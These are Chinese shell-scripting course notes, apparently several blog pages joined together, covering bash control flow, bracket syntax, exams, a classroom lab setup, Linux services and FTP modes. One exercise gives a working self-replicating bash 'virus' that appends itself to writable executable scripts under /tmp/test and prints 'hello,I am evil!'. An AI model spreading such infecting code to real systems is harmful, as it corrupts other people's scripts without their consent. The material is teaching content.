要求根据userlist创建用户，要求指定用户名，用户id，用户的默认组和附加组及变更用户u密码，若对应用户的附加组不存在，则将附加组创建出来后再根据要求添加用户。 [root@rhel6 ~]# cat /tmp/useraddlist1 dabao 888 xuexi,it uplooking lucy 889 sales,it uplooking lily 899 pro,aa uplooking12345678910111213141516[root@client0 ~]# cat useradd.sh#!/bin/bashwhile read ado A=($a) groupadd ${A[2]} &amp;&gt; /dev/null useradd -u ${A[1]} -G ${A[2]} ${A[0]} &amp;&gt; /dev/null echo ${A[3]}|passwd --stdin ${A[0]} &amp;&gt; /dev/null id ${A[0]}done&lt;/root/userlist[root@client0 ~]# bash useradd.shuid=777(carol) gid=1001(carol) groups=1001(carol),1000(tom)uid=778(natasha) gid=1002(natasha) groups=1002(natasha),1000(tom)uid=779(r1) gid=1003(r1) groups=1003(r1),1000(tom) 晚自习作业 完成今天课上的所有练习题目 石子游戏：有n石子，谁拿到最后一个石子谁赢，用户可以指定一共由多少个石子，每次最多可以拿的石子数是可以给用户指定的 创建一个以今天日期为名的目录20160811;将/目录下所有以.sh结尾的文件复制到新创建的目录中；将该目录打包压缩存到/tmp目录下保存。 123456789101112131415161718192021222324252627282930[root@client0 ~]# cat game#!/bin/bashread -p &quot;游戏开始！请玩家指定石子的个数:&quot; n1read -p &quot;请玩家指定每次取石子的最多个数:&quot; n2k=$(($n1%($n2+1)))j=$(($n1/($n2+1)))HH () {for i in `seq 1 $j`do read -p &quot;请玩家取石子:&quot; w echo &quot;我取 $((($n2+1)-$w)) 个石子&quot; q=$(($q-($n2+1))) echo &quot;目前还剩下 $q 个石子&quot; [ $q -eq 0 ] &amp;&amp; echo &quot;你输了@.@!&quot;done}if [[ $k -gt 0 ]]then echo &quot;我先取 $k 个石子&quot; q=$(($n1-$k)) echo &quot;目前还剩下 $q 个石子&quot; HHelse q=$n1 HHfi case 语法格式123456789101112case 取值 in取值 1) CMD1 ; cmd11; cmd12;;取值 2) CMD2 ;;取值 3) CMD3 ;;*) CMD4 ;;esac* 代表除了以上所有的取值 , 做某一些操作 课堂练习 请问你是否喜欢shell脚本？ 如果你回答yes，则程序退出，否则永远会问你是否喜欢shell脚本？ 1234567891011121314151617181920212223242526[root@client0 ~]# cat 1.sh#!/bin/bashread -p &quot;请问你是否喜欢shell脚本？&quot; anuntil [ $an = yes ]docase $an inyes) exit;;*) read -p &quot;请问你是否喜欢shell脚本？&quot; an;;esacdone[root@client0 ~]# bash 1.sh请问你是否喜欢shell脚本？yes[root@client0 ~]# bash 1.sh请问你是否喜欢shell脚本？no请问你是否喜欢shell脚本？lsdjflksd请问你是否喜欢shell脚本？lsdjflksd请问你是否喜欢shell脚本？iii请问你是否喜欢shell脚本？fuck you1.sh: line 4: [: too many arguments请问你是否喜欢shell脚本？...请问你是否喜欢shell脚本？^^^[[D请问你是否喜欢shell脚本？yes continue 语法格式continue 作用于循环语句中 代表跳出这个循环进入下个循环 .课堂练习 要求输出100以下所有能够被7整除，但不能够被5整除的数字。（并在一行输出） break 语法格式break 作用于循环语句中 代表直接跳出该循环 .课堂练习 要求找出系统中属于student用户的一个文件. 1234567[root@client0 ~]# cat file.sh#!/bin/bashfor i in `find / -user student 2&gt;/dev/null`do echo $i breakdone shift 语法格式位置参数1234567 $1 代表的是输入的第一个参数$2 代表的是输入的第二个参数 ....$0 代表的是 bash 程序本身名$# 代表的是参数的个数${10} 超过的两位的${*}或者${@} 代表将所有位置参数shift 代表移走第一位位置参数 , 由后续的位置参数前移一位 . 课堂练习 显示位置参数的值，以及可执行脚本名称，参数的总数 function 语法格式functname () { shell commands } 函数的调用 直接调用函数– 函数名 传入参数– 函数名 参数1 参数2 参数3 使用return返回函数结束状态 函数中的局部变量和全局变量 默认为全局变量，因此不同的函数不可以使用同一个变量；如果要变成局部变量，需要使用local来修饰，那么不同的函数就不能访问到这个局部变量。 函数返回值 return可以使用return命令来设置返回值； 例如 return 0 123456789#### 课堂练习5. 创建一个命令booboo，命令用法如下：booboo -t 30s 代表睡30s；即-t后跟时间booboo -l /tmp 代表显示某个目录下面的内容和属性以及目录本身的属性booboo -r /tmp/file 代表删除某个文件booboo --help 代表帮助信息显示该命令的用法6. 输入你的出生日期，程序会告诉你距离你下一个生日还有几天？ 12345678910111213141516171819202122232425262728293031[root@client0 ~]# cat booboo#!/bin/bashSLEEP (){ sleep $1}DIR (){ ls -l $1 ls -ld $1}RM (){ rm -rf $1}case $1 in-t) SLEEP $2;;-l) DIR $2;;-r) RM $2;;--help) echo &quot;Usage: ls [-t|-l|-r|--help] [values]&quot;;;*) echo &quot;Usage: ls [-t|-l|-r|--help] [values]&quot;;;esac[root@client0 ~]# ./booboo -t 3s使用bash写一个脚本实现以下功能： 1) -r 查看系统发行版本2) -k 查看系统内核版本3) -d 查看系统磁盘信息4) -u 查看当前系统用户5) -t 查看系统运行时间6) -s 查看selinux状态7) -f 查看内存信息8) -n 查看网络信息9) -a 实现以上所有功能10）–help 查看帮助12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#!/bin/bashREL () {cat /etc/redhat-release }KER () {uname -a}DIS () {df -h}USR () {who}UPT () {uptime}SEL () {getenforce}FER () {free -m}NET () {ifconfig}case $1 in-r) REL;; -k) KER;;-d) DIS;;-u) USR;;-t) UPT;;-s) SEL;;-f) FER;;-n) NET;;-a) REL;KER;DIS;USR;UPT;SEL;FER;NET;;--help) echo &quot;this is help&quot;esac 用shell脚本写一个病毒，要求如下： 可以感染系统中的所有Bourne-Again shell script的脚本,可执行，可写； 执行感染后的bash shell脚本会输出”echo hello,I am evil!” 如果已经被感染，就不再感染 12#!/bin/bashif [ ! -f /tmp/.mybblock ];then touch /tmp/.mybblock; for i in `find /tmp/test/*` ; do grep &quot;mybblock&quot; $i &amp;&gt; /dev/null &amp;&amp; continue ; file $i | grep &quot;Bourne-Again shell script&quot; &amp;&gt; /dev/null || continue ; [ -x $i -a -w $i ] || continue ; tail -n 1 $0 &gt;&gt; $i; done ; echo &quot;hello,I am evil!&quot;; rm -rf /tmp/.mybblock &amp;&gt; /dev/null ; fi如果foo.sh 的第一个位置参数为-s ，那么就沉睡，时间由第二个位置参数决定12345678910111213#!/bin/bashSLEEP (){ echo &quot;now sleep&quot; sleep $1}case $1 in-s) SLEEP $2;;*) exit;;esac","link":"/2016/12/23/booboo_bash_shell_scripts/01_shell_flow_control_statement/"},{"title":"LINUX Shell Scripts 第五课 各种括号的作用","text":"一、小括号,圆括号()1、单小括号 ()1 命令组。括号中的命令将会新开一个子shell顺序执行,所以括号中的变量不能够被脚本余下的部分使用。括号中多个命令之间用分号隔开,最后一个命令可以没有分号,各命令和括号之间不必有空格。 2 命令替换。等同于cmd,shell扫描一遍命令行,发现了$(cmd)结构,便将$(cmd)中的cmd执行一次,得到其标准输出,再将此输出放到原来命令。有些shell不支持,如tcsh。 3 用于初始化数组。如:array=(a b c d) 2、双小括号 (( ))1 整数扩展。这种扩展计算是整数型的计算,不支持浮点型。((exp))结构扩展并计算一个算术表达式的值,如果表达式的结果为0,那么返回的退出状态码为1,或者 是”假”,而一个非零值的表达式所返回的退出状态码将为0,或者是”true”。若是逻辑判断,表达式exp为真则为1,假则为0。 2 只要括号中的运算符、表达式符合C语言运算规则,都可用在$((exp))中,甚至是三目运算符。作不同进位(如二进制、八进制、十六进制)运算时,输出结果全都自动转化成了十进制。如:echo $((16#5f)) 结果为95(16进位转十进制) 3 单纯用 (( )) 也可重定义变量值,比如 a=5; ((a++)) 可将 $a 重定义为6 4 常用于算术运算比较,双括号中的变量可以不使用$符号前缀。括号内支持多个表达式用逗号分开。 只要括号中的表达式符合C语言运算规则,比如可以直接使用for((i=0;i&lt;5;i++)), 如果不使用双括号, 则为for i in seq 04或者for i in {0..4}。再如可以直接使用if (($i&lt;5)), 如果不使用双括号, 则为if [ $i -lt 5 ]。 二、中括号,方括号[]1、单中括号 []1 bash 的内部命令,[和test是等同的。如果我们不用绝对路径指明,通常我们用的都是bash自带的命令。if/test结构中的左中括号是调用test的命令标识,右中括号是关闭条件判断的。这个命令把它的参数作为比较表达式或者作为文件测试,并且根据比较的结果来返回一个退出状态码。if/test结构中并不是必须右中括号,但是新版的Bash中要求必须这样。 2 Test和[]中可用的比较运算符只有==和!=,两者都是用于字符串比较的,不可用于整数比较,整数比较只能使用-eq,-gt这种形式。无论是字符串比较还是整数比较都不支持大于号小于号。如果实在想用,对于字符串比较可以使用转义形式,如果比较”ab”和”bc”:[ ab &lt; bc ],结果为真,也就是返回状态为0。[ ]中的逻辑与和逻辑或使用-a 和-o 表示。 3 字符范围。用作正则表达式的一部分,描述一个匹配的字符范围。作为test用途的中括号内不能使用正则。 4 在一个array 结构的上下文中,中括号用来引用数组中每个元素的编号。 2、双中括号[[ ]]1 [[是 bash 程序语言的关键字。并不是一个命令,[[ ]] 结构比[ ]结构更加通用。在[[和]]之间所有的字符都不会发生文件名扩展或者单词分割,但是会发生参数扩展和命令替换。 2 支持字符串的模式匹配,使用=~操作符时甚至支持shell的正则表达式。字符串比较时可以把右边的作为一shell中各种括号的作用()、个模式,而不仅仅是一个字符串,比如[[ hello == hell? ]],结果为真。[[ ]] 中匹配字符串或通配符,不需要引号。 3 使用[[ … ]]条件判断结构,而不是[ … ],能够防止脚本中的许多逻辑错误。比如,&amp;&amp;、||、&lt;和&gt; 操作符能linux shell下除了某个文件外的其他文件全部删除够正常存在于[[ ]]条件判断结构中,但是如果出现在[ ]结构中的话,会报错。比如可以直接使用if [[ $a != 1 &amp;&amp;$a != 2 ]], 如果不适用双括号, 则为if [ $a -ne 1] &amp;&amp; [ $a != 2 ]或者if [ $a -ne 1 -a $a != 2 ]。 4 bash把双中括号中的表达式看作一个单独的元素,并返回一个退出状态码。 三、大括号、花括号 {}1、常规用法1 大括号拓展。(通配(globbing))将对大括号中的文件名做扩展。在大括号中,不允许有空白,除非这个空白被引用或转义。第一种:对大括号中的以逗号分割的文件列表进行拓展。如 touch {a,b}.txt 结果为a.txt b.txt。第二种:对大括号中以点点(..)分割的顺序文件列表起拓展作用,如:touch {a..d}.txt 结果为a.txt b.txt c.txtd.txt 2 代码块,又被称为内部组,这个结构事实上创建了一个匿名函数 。与小括号中的命令不同,大括号内的命令不会新开一个子shell运行,即脚本余下部分仍可使用括号内变量。括号内的命令间用分号隔开,最后一个也必须有分号。{}的第一个命令和左括号之间必须要有一个空格 2、几种特殊的替换结构${var:-string},${var:+string},${var:=string},${var:?string} 1 ${var:-string}和${var:=string}:若变量var为空,则用在命令行中用string来替换${var:-string},否则变量var不为空时,则用变量var的值来替换${var:-string};对于${var:=string}的替换规则和${var:-string}是一样的,所不同之处是${var:=string}若var为空时,用string替换${var:=string}的同时,把string赋给变量var:${var:=string}很常用的一种用法是,判断某个变量是否赋值,没有的话则给它赋上一个默认值。 2 ${var:+string}的替换规则和上面的相反,即只有当var不是空的时候才替换成string,若var为空时则不替换或者说是替换成变量 var的值,即空值。(因为变量var此时为空,所以这两种说法是等价的) 3 ${var:?string}替换规则为:若变量var不为空,则用变量var的值来替换${var:?string};若变量var为空,则把string输出到标准错误中,并从脚本中退出。我们可利用此特性来检查是否设置了变量的值。 补充扩展:在上面这五种替换结构中string不一定是常值的,可用另外一个变量的值或是一种命令的输出。 3、四种模式匹配替换结构模式匹配记忆方法: 1234# 是去掉左边(在键盘上#在$之左边)% 是去掉右边(在键盘上%在$之右边)#和%中的单一符号是最小匹配,两个相同符号是最大匹配。${var%pattern},${var%%pattern},${var#pattern},${var##pattern} 4、字符串提取和替换${var:num},${var:num1:num2},${var/pattern/pattern},${var//pattern/pattern} 第一种模式:${var:num},这种模式时,shell在var中提取第num个字符到末尾的所有字符。若num为正数,从左边0处开始;若num为负数,从右边开始提取字串,但必须使用在冒号后面加空格或一个数字或整个num加上括号,如${var: -2}、${var:1-3}或${var:(-2)}。 第二种模式:${var:num1:num2},num1是位置,num2是长度。表示从$var字符串的第$num1个位置开始提取长度为$num2的子串。不能为负数。 第三种模式:${var/pattern/pattern}表示将var字符串的第一个匹配的pattern替换为另一个pattern。 。 第四种模式:${var//pattern/pattern}表示将var字符串中的所有能匹配的pattern替换为另一个pattern。 四、符号$后的括号 (1) ${a} 变量a的值, 在不引起歧义的情况下可以省略大括号。 (2) $(cmd) 命令替换,和cmd效果相同,结果为shell命令cmd的输,过某些Shell版本不支持$()形式的命令替换, 如tcsh。 (3) $((expression)) 和exprexpression效果相同, 计算数学表达式exp的数值, 其中exp只要符合C语言的运算规则即可, 甚至三目运算符和逻辑表达式都可以计算。 五、使用多条命令执行 (1)单小括号,(cmd1;cmd2;cmd3) 新开一个子shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开,最后一个命令后可以没有分号。 (2)单大括号,{ cmd1;cmd2;cmd3;} 在当前shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开, 最后一个命令后必须有分号, 第一条命令和左括号之间必须用空格隔开。对{}和()而言, 括号中的重定向符只影响该条命令, 而括号外的重定向符影响到括号中的所有命令。","link":"/2016/12/23/booboo_bash_shell_scripts/04_shell_brackets/"},{"title":"LINUX 基础服务课程环境使用说明","text":"UP100 课程基于RHEL6.5、RHEL7.0、ubuntu1604、WindowsXP和Windows2012R2系统 需要开启虚拟机可以直接双击图标，第一次启动时将从讲师机下载映像文件，可能会比较慢。 控制虚拟机可以使用kiosk用户，执行rht-vmctl命令，请自行查看命令使用。 授课网络环境配置如下f0~fN为教室物理机，其域名为foundationN.ilt.example.com ,可简写为fN。其IP为172.25.N.250，f0特殊为172.25.254.250。 classroom虚拟机为所有物理机和虚拟机的默认网关，配置了多个网卡设置了所有172.25.N.254的地址，保证虚拟机、物理机和各个学生机之间的路由。配置了DHCP、DNS和HTTP服务，其域名为classroom.example.com可简写为classroom。 rhel6虚拟机均安装RHEL6.5系统，rhel7虚拟机均安装RHEL7.0系统，ubuntu1604虚拟机均安装Ubuntu1604系统，均安装图形化界面并配置runlevel 5启动，root密码为uplooking ，配置了基础的YUM源指向classroom， rhel6、rhel7、ubuntu1604、winxp和win2012r2虚拟机均配置了1块虚拟机网卡，eth0接入物理机br0网桥，动态获得ip地址: hostname ipaddr rhel7 172.25.N.10 rhel6 172.25.N.11 winxp 172.25.N.12 ubuntu 172.25.N.14 win2012r2 172.25.N.15 rhel6、rhel7、ubuntu1604虚拟机均配置两块虚拟硬盘vda和vdb，以方便授课演示。除winxp和win2012r2之外其它虚拟机均配置2GB运行内存，winxp配置1GB运行内存，win2012r2配置4GB运行内存。 winxp虚拟机主机上安装了如下软件： Cisco Packet Tracer Putty Winscp Xshell Wireshark Navicat for Mysql Microsoft Visio 2010 7-zip 已在classroom上完成DNS配置，正向和方向域名及邮件代理域名和虚拟机域名设置如下： rhel7主机：172.25.N.10 rhel7-fN.example.com dN.example.com imapN.example.com smtpN.example.com (MX) rhel6主机： 172.25.N.11 rhel6-fN.example.com sN.example.com wwwN.example.com webapp-fN.example.com winxp主机： 172.25.N.12 winxp-fN.example.com install 主机：172.25.N.13 install-fN.example.com ubuntu主机：172.25.N.14 ubuntu-fN.example.com win2012r2主机：172.25.N.15 win2012r2-fN.example.com 注意事项rhel6.5 SElinux有bug，光盘中默认没有selinux相关manpage，看manpage需要安装selinux-policy-doc包，但这个包需要从RHN下载。 网络拓扑图 基础服务简介本章将讲解以下内容： RHEL6 中Linux系统服务的基础知识、System V与Xinetd的概念，以及通过 servcie 命令来启动某一服务，通过 chkconfig 命令来设置服务是否开机启动 RHEL7 中 已经替换掉 System V init，并正式采用全新的初始化进程 Systemd，以及通过systemctl 命令来启动某一服务和设置该服务是否开机启动 重点简介rhel6，rhel7只做命令的介绍，具体内容请参考《systemd说明》 系统服务的基本概念服务，其实就是运行在操作系统后台的一个或者多个应用程序，为计算机系统或用户提供某项特定的服务。 在我们的windows操作系统中，其在后台也运行了许许多多的服务。例如我们装的杀毒软件，其在后台运行了许多我们看不见的服务程序，通过这些服务来为用户或者计算机系统来提高特定的功能。 服务通常是不中断运行的，随时准备接受请求，从而提供某项服务。例如我们日常使用的网页服务，其就是由一个运行在所访问网站的服务器上的httpd服务提供的服务，我们通过在浏览器输入需要访问网站的域名，服务器端的httpd服务就会随时的接收我们发送过来的请求，并响应回给我们的用户。 我们Linux系统绝大多数服务都是网络服务，例如邮件服务、FTP服务、httpd服务等等，网络服务可以使为其他用户、其他计算机提供特定的服务。 services 和 daemons 服务名 守护进程名 rsyslog rsyslogd atd atd crond crond 服务的分类 服务名通常有两个，一个这个基于程序的服务名称，我们把它叫做service，比如说ftp服务，samba服务等等。还有一个是基于进程的服务名称，我们通常把它叫做daemon，守护进程，也就是我们使用ps命令时候看到的名称，比如httpd，比如named之类的等等，一般服务的进程名都是程序名称后加上一个d，当然也有不少的特例。之后我们都会一一去说这些服务。 基于 daemon 分类那么根据daemon，也就是守护进程，我们可以把服务分成两类，一类是独立启动的服务，叫做stand alone daemon，我们之后学的服务基本上都是独立启动的服务。另外一种叫做super daemon。我们分开来来说一下这两种服务的特征。 1&gt; stand alone daemon 独立启动服务 2&gt; super daemon 超级服务 xinted System V总的来说，Linux系统通常作为服务器端的操作系统来用的，所以Linux系统提供了许许多的的服务，有些服务需要我们自己来进行配置，这些服务的目的就是为了给我们的计算机、用户提供某项特定的功能。那么对于各种不同的服务，Linux系统是怎么样来统一进行管理的呢？ 在Linux操作系统中，Linux对于服务的管理体系是沿用了System V的服务管理体系，System V原来是早期AT&amp;T的一个操作系统。 对于Linux系统，System V提供了运行级别的概念，还记得之前一直提到过的Linux的启动运行级别吗？没错，System V一共提供了7种运行级别 0 关机 1 单用户模式 2 不带网络的多用户模式 3 带网络的多用户模式，纯文本界面 4 未使用 5 带网络的多用户模式，图形界面 6 重启 对于我们来说，通常使用的是级别3和级别5，每个级别下都有对应的启动、不启动的服务，比如单用户模式下，所有的服务都是不启动，这些都是通过System V这个服务管理体系来决定的 System V定义了init为系统启动的第一个进程，进程PID=1，这个进程的目的就是去查看 /etc/inittab 中的系统启动级别从而来启动对应的服务 对于不同的服务，因为其提供该服务的厂家不同，所以这些的服务的启动、关闭机制通常不同，在Linux系统中，为了方便的管理这些服务，每个服务的启动、结束、重启等操作都由一个System V脚本来进行控制，拥有固定的格式。 对于Linux系统上的服务，这些服务的System V脚本文件都是存放在 /etc/rc.d/init.d 这个目录下 12345678910111213141516[root@rhel6 ~]# cd /etc/rc.d/init.d/[root@rhel6 ~]# lsabrt-ccpp firstboot messagebus quota_nld snmptrapdabrtd functions mysqld rdisc spice-vdagentdabrt-oops haldaemon netconsole restorecond sshdacpid halt netfs rngd sssdatd htcacheclean network rpcbind sysstatauditd httpd NetworkManager rpcgssd udev-postautofs ip6tables nfs rpcidmapd vboxaddblk-availability iptables nfslock rpcsvcgssd vboxadd-servicebluetooth irqbalance ntpd rsyslog vboxadd-x11certmonger kdump ntpdate sandbox vncservercpuspeed killall oddjobd saslauthd wdaemoncrond lvm2-lvmetad portreserve single winbindcups lvm2-monitor postfix smartd wpa_supplicantdnsmasq mdmonitor psacct snmpd ypbind 我们看到在这个目录下，存在了许多纯文本文件，这些文件都是系统每一个服务的System V的脚本文件，对于该脚本文件，我们要启动什么服务，都是通过这些脚本文件来启动的，我们也可以通过编写System V脚本文件来手工创建一个我们自己的由System V来控制的服务。 对于Linux的所有的这些服务，我们通过 service 这个命令来进行统一的管理 命令 service 可以调用指定服务的System V脚本，并执行指定的动作 service 服务名 [start | stop | restart | status] 对于Linux系统的这些服务，我们都是通过 service 这个命令去调用该服务对应的System V脚本，并执行其指定的动作 刚才我们也说到了，System V定义了运行级别的概念，每个运行级别对应有启动、不启动的服务，在 /etc/rc.d 这个目录下，除了我们刚才的 init.d 这个目录，我们还发现还有其它的一些目录，诸如 rc0.d、rc1.d等这些目录就分别对应了系统的7中启动级别，每个目录里面都存放了许多的文件，每个文件对应着一个特定的服务，并标志有是否开机启动以及启动顺序。 我们发现，在这些目录里面，存放的都是链接文件，不过这每一个链接文件的名字都有着严格的规定。每一个链接文件都由3部分组成 K15httpd -&gt; ../init.d/httpd　　　　S55sshd -&gt; ../init.d/sshd ①第一个部分是第一个字母K或者S，表示该服务是不是是不是开机自动启动，K表示开机不启动，S表示开机就启动 ②第二个部分是一个数字，这个数字代表的是该服务的启动顺序，服务启动的顺序非常的重要，例如我们的网络服务需要在邮件服务之前启动 ③第三个部分就是对应服务的名字，该链接文件其实都是指向的是 init.d 这个目录下的System V脚本文件 我们如果希望某服务开机就启动，可以通过修改 rc5.d 目录下的链接文件，不过这样做很麻烦，Linux系统提供了一个 chkconfig 命令可以来设置服务是否开机启动 我们通过 chkconfig --list 命令来查看所有服务的开机启动情况 比如我们需要设置 network 服务开启自动启动，可以使用 chkconfig httpd on 命令即可 比如我们需要设置 network 服务开启不启动，可以使用 chkconfig httpd off 命令即可 xinetd其实对于上面通过 System V来管理的一些服务都属于Linux系统的常驻运行的服务，其实在Linux系统中还有许多不常驻的一些服务，例如 telnet、rsync服务，这些服务则是通过 xinetd 这个服务来进行管理的。 xinetd 控制的就是那些不常驻的服务，功能较为简单的服务 xinetd其实自己本身就是作为一个系统的常驻的服务运行在后台，而xinetd所控制的服务在没有连接请求的时候是不运行的，所有xinetd控制的服务的连接请求都会提交给xinetd来进行代理 xinetd在收到一个请求后，会根据请求的协议及服务启动相应的服务进程，进程处理完后请求就会结束 xinetd本身就是一个系统服务，通过 System V来对其进行管理，在CentOS6/RHEL6中，xinetd服务默认是没有安装的，我们若要使用该服务，首先需要安装它yum install xinetd 在我们安装好我们的xinetd服务以后，我们这时再通过 chkconfig --list 命令来查看所有的服务启动设置 我们看到，在安装了xinetd服务以后，其下面出现了一些其他的服务选项，例如rsync，chargen-dgram等这些服务，这些服务都是系统的一些不常驻服务，都是通过xinetd这个服务来对其进行管理的 xinetd服务的配置文件是 /etc/xinetd.conf 端口号 查看 netstat -luntp 软件名 net-tools 基础服务总结RHEL 6 服务的启动 停止 重启 状态 service 服务名 [start | stop | restart | status] 服务开机启动状态 chkconfig --list 设置服务开机启动 chkconfig 服务名 on 设置服务开机不启动 chkconfig 服务名 off RHEL 7 服务的启动 停止 重启 状态 systemctl [start | stop | restart | status] 服务名 设置服务开机启动 systemctl enable 服务名 设置服务开机不启动 systemctl disable 服务名","link":"/2016/12/23/booboo_easy_service/00_linux_classroom_env/"},{"title":"LINUX Shell Scripts 第七课 笔试","text":"一：纠错题：请找出以下代码有错误的地方并更正。（3*20）1. 两个数字相加1234#!/bin.bashread -p &quot;input number1&quot; : num1read -p &quot;input number2&quot; : num2echo $(num1+num2)请将更正脚本保存，名为1.sh，存放路径为/home/kiosk/Desktop/stux/1.sh ,其中x为你的机号;在脚本中用#注释出题目中错误的地方 2. 将开机selinux状态设置为disabled12#!/bin/bashsed &apos;SELINUXs/disabled/enforcing/&apos; /etc/selinux/config请将更正脚本保存，名为2.sh，存放路径为/home/kiosk/Desktop/stux/2.sh ,其中x为你的机号;在脚本中用#注释出题目中错误的地方 3. 判断100以内被5整除但是不能被7整除的数字12345678#!/bin/bashfor i in (seq 1 100)A=$(($i % 5))B=$(($i%7))if [ $A -eq 0 ] -a [ $B -ne 0 ]thenecho $ifi请将更正脚本保存，名为3.sh，存放路径为/home/kiosk/Desktop/stux/3.sh ,其中x为你的机号;在脚本中用#注释出题目中错误的地方 二：填空题（2*10）123456789101. 通过什么符号计算传递进来的位置参数？__________2. 如何检查之前的命令是否运行成功？__________3. 如何获取一个文件每一行以空格为分隔的第三个元素？__________4. 调试bash脚本的参数为？__________5. A=a:b:c:d echo ${A//:/} 结果是__________6. awk的NR变量作用是什么？___________________7. 如何获取数组的长度? ____________8. 如何引用传递给脚本的第十个位置参数？_______________9. $$的含义？_____________________10. 命令 “export” 有什么用？ ____________________________ 三：选择题（2*10）12345678910111213141516171819202122232425262728293031323334353637383940414243444546471. Awk里的内置变量NF指的是（ ）A） 所有输入文件记录的行数 B） 单个输入文件记录的行数C） 以指定分隔符号作为分隔的列数 D） AWK处理文件的个数2. 跳出当前循环，进入下一个循环使用的语句是（ ）A） continue B）break C）exit D）return3. 使用正则表达式的语句sed -n &apos;/^\\&lt;[^0-9a-d]*\\&gt;$/p&apos; /tmp/list输出的可能是以下哪个（ ）A）kevin alice B）selenaC）peter D）23naive4. 以下哪个选项关于数组赋值是错误的（ ）A） A[1]=3 B）A=([15]=1 a d e)C）A=((6 7 0 2)) D）A=(15 3 47 a)5. 以下哪个表达式可以算出8+3的结果（ ）A） echo $((8+3))B） echo $(8+3)C） echo ${8+3}D） echo $[[8+3]]6. 以下哪个流程语句是判断为真则做循环（ ）A） until B）whileC）case D）for7. 阅读以下代码，该代码输出结果是（ ）#!/bin/bashi=0sum=0while [ $i -le 5 ]do sum=$(($sum+$i)) i=$(($i+1))done echo $sumA）10 B）21 C）15 D）该代码执行会产生死循环8. 函数内如何设置局部变量（ ）A） local B）exportC）source D）function9. 以下哪一种指令显示的结果为$test（ ）A）\\echo $test B）echo &quot;$test&quot;C）echo &apos;$test&apos; D）echo &quot;${test}&quot;10. shift的作用是（ ）A） 定义返回值 B）移动位置参数C）跳出脚本 D）跳出循环","link":"/2016/12/23/booboo_bash_shell_scripts/shell-test02/"},{"title":"LINUX Shell Scripts 第六课 上机考试","text":"请将脚本保存，存放路径为/home/kiosk/Desktop/stux/,其中x为你的机号test.sh num.sh checkip.sh dns.sh useradd.sh 每题20分 1.流程控制语句应用测试：12编写一个脚本，脚本名为test.sh判断/tmp/test1至/tmp/test50和/etc/passwd /etc/hosts文件存在不存在，若不存在则将该文件创建出来。 2.按照运行结果编写Shell脚本：12345678910111213要求：1）脚本名为num.sh 2）要求显示结果如下： 第一行0，第二行01，第三行012，以此类推，输出如上0到9的结果即可。0010120123012340123450123456012345670123456780123456789 3.正则表达式应用测试：1234567编写一个IP检测脚本1） 脚本名为checkip.sh2） 输入参数为$1，$1 为要判断的输入，如果$1 为ip 地址，则输出”This is ip address”,如果$1 为非ip 地址，则输出”This is not ip address”3） 执行方法为checkip.sh 192.168.1.14） 测试如下输入值192.168.0.199 192.a.12.0 24.235.299.1 192.168.3 4.实际应用测试11234编写一个脚本，脚本名为dns.sh,通过脚本搭建dns。要求： 解析uplooking.com域名 A记录有www.uplooking.com 10.2.2.2 PTR记录有相应的反向解析 5.实际应用测试2123456编写一个脚本，脚本名为useradd.sh要求根据userlist创建用户，要求指定用户名，用户id，用户的默认组和附加组及变更用户u密码，若对应用户的附加组不存在，则将附加组创建出来后再根据要求添加用户。 [root@rhel6 ~]# cat /tmp/useraddlist1 dabao 888 xuexi,it uplooking lucy 889 sales,it uplooking lily 899 pro,aa uplooking 6.病毒自我复制脚本7.获取apache访问日志中访问次数最多的前5个ip地址","link":"/2016/12/23/booboo_bash_shell_scripts/shell-test01/"},{"title":"FTP文件共享服务","text":"课程要求 设置vsftpd服务匿名用户能够对/var/ftp/pub/目录有上传下载的权限。 系统用户能够访问家目录，上传下载删除 除了系统用户student有chroot的权限，其他系统用户没有chroot的权限 FTP服务FTP 是File Transfer Protocol（文件传输协议）的英文简称，而中文简称为“文传协议”。用于Internet上的控制文件的双向传输。同时，它也是一个应用程序（Application）。基于不同的操作系统有不同的FTP应用程序，而所有这些应用程序都遵守同一种协议以传输文件。在FTP的使用当中，用户经常遇到两个概念：”下载”（Download）和”上传”（Upload）。”下载”文件就是从远程主机拷贝文件至自己的计算机上；”上传”文件就是将文件从自己的计算机中拷贝至远程主机上。用Internet语言来说，用户可通过客户机程序向（从）远程主机上传（下载）文件。 FTP原理FTP只通过TCP连接,没有用于FTP的UDP组件。 FTP不同于其他服务的是它使用了两个端口, 一个数据端口和一个命令端口(或称为控制端口)。 通常21端口是命令端口，20端口是数据端口。当混入主动/被动模式的概念时，数据端口就有可能不是20了。 工作模式 FTP支持两种模式： Standard (PORT方式，主动方式) Passive (PASV，被动方式)。 Port模式 主动模式下，FTP客户端从任意的非特殊的端口（N &gt; 1023）连入到FTP服务器的命令端口–21端口。然后客户端在N+1（N+1 &gt;= 1024）端口监听，并且通过N+1（N+1 &gt;= 1024）端口发送命令给FTP服务器。服务器会反过来连接用户本地指定的数据端口，比如20端口。 以服务器端防火墙为立足点，要支持主动模式FTP需要打开如下交互中使用到的端口： FTP服务器命令（21）端口接受客户端任意端口（客户端初始连接） FTP服务器命令（21）端口到客户端端口（&gt;1023）（服务器响应客户端命令） FTP服务器数据（20）端口到客户端端口（&gt;1023）（服务器初始化数据连接到客户端数据端口） FTP服务器数据（20）端口接受客户端端口（&gt;1023）（客户端发送ACK包到服务器的数据端口） 用图表示如下： 在第1步中，客户端的命令端口与FTP服务器的命令端口建立连接，并发送命令“PORT 1027”。然后在第2步中，FTP服务器给客户端的命令端口返回一个”ACK”。在第3步中，FTP服务器发起一个从它自己的数据端口（20）到客户端先前指定的数据端口（1027）的连接，最后客户端在第4步中给服务器端返回一个”ACK”。 主动方式FTP的主要问题实际上在于客户端。FTP的客户端并没有实际建立一个到服务器数据端口的连接，它只是简单的告诉服务器自己监听的端口号，服务器再回来连接客户端这个指定的端口。对于客户端的防火墙来说，这是从外部系统建立到内部客户端的连接，这是通常会被阻塞的。 Passive模式 为了解决服务器发起到客户的连接的问题，人们开发了一种不同的FTP连接方式。这就是所谓的被动方式，或者叫做PASV，当客户端通知服务器它处于被动模式时才启用。 在被动方式FTP中，命令连接和数据连接都由客户端，这样就可以解决从服务器到客户端的数据端口的入方向连接被防火墙过滤掉的问题。当开启一个FTP连接时，客户端打开两个任意的非特权本地端口（N &gt;; 1024和N+1）。第一个端口连接服务器的21端口，但与主动方式的FTP不同，客户端不会提交PORT命令并允许服务器来回连它的数据端口，而是提交PASV命令。这样做的结果是服务器会开启一个任意的非特权端口（P &gt;; 1024），并发送PORT 